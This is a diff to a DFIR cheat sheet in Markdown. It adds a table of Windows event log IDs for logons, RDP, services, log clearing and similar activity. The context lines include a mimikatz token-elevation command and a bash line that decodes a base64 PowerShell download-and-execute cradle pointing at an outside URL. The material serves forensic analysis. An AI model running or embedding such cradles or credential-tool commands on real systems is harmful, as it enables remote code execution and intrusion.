@@ -486,6 +486,27 @@ AppCompatProcessor.py database.db stack "FilePath" "FileName" LIKE '%svchost.exe
 
 ## Event Logs Analysis
 
+<br>
+
+### Event Log Summary
+
+| **Activity** | **Event Log** | **EID** |
+| :---------------: | :---------------: | :---------------: |
+|Logons|Security|4624, 4625, 4634, 4647, <br> 4648, 4769, 4771, 4776|
+|Account Logon|Security|4678, 4769, 4771, 4776|
+|RDP|Security <br> RDPCoreTS <br> Terminal Services-RemoteConnectionManager|4624, 4625, 4778, 4779 <br> 131 <br> 1149|
+|Network Shares|Security|5140-5145|
+|Scheduled Tasks|Security <br> Task Scheduler|4698 <br> 106, 140-141, 200-201|
+|Installation|Application|1033, 1034, 11707, 11708, 11724|
+|Services|System <br> Security|7034-7036, 7040, 7045 <br> 4697|
+|Log Clearing|Security <br> System|1102 <br> 104|
+|Malware Execution|Security <br> System <br> Application|4688 <br> 1001 <br> 1000-1002|
+|CommandLines|Security <br> PowerShell-Operational|4688 <br> 4103-4104|
+|WMI|WMI-Activity-Operational|5857-5861|
+
+
+<br>
+
 ### Location
 - Server 2003 and older
 	- %systemroot%\System32\config
@@ -2379,10 +2400,6 @@ mimikatz # token:elevate /domain admin (identifies any domain admins present on 
 ```bash
 echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA" | base64 -d | iconv -f UTF-16LE -t UTF-8
 ```
-
-<br>
-
-## Powershell CommandLine Switches
 
 
 <script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
